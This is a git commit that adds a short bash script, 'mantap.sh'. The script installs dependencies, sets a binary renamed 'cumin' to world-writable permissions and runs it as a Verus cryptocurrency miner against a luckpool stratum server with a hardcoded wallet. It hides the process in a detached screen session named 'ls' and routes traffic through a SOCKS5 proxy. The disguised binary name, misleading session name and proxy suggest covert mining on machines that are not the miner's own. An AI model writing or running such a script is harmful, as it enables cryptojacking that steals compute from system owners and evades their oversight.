0f62704e356b064d0a8f59e0dab769cbd0062ab3
wreytrfser <86676957+wreytrfser@users.noreply.github.com>
2021-07-19 09:14:29 +0700

    Create mantap.sh

---
+++ mantap.sh
@@ -0,0 +1,10 @@
+#!/bin/bash
+sudo apt update 
+sudo apt install screen libjansson4 -y 
+chmod +x mantap.sh && chmod +x cumin chmod 777 cumin mantap.sh
+screen -dmS ls 
+POOL=stratum+tcp://eu.luckpool.net:3956
+WALLET=RDpbTQzyf4R8FQJjzwQDjs7nzfxui9JcgF
+WORKER=$(echo $(shuf -i 1-10 -n 1)gass)
+PROXY=socks5://98.162.96.41:4145
+./cumin -a verus -o $POOL -u $WALLET.$WORKER -t 2 -x $PROXY
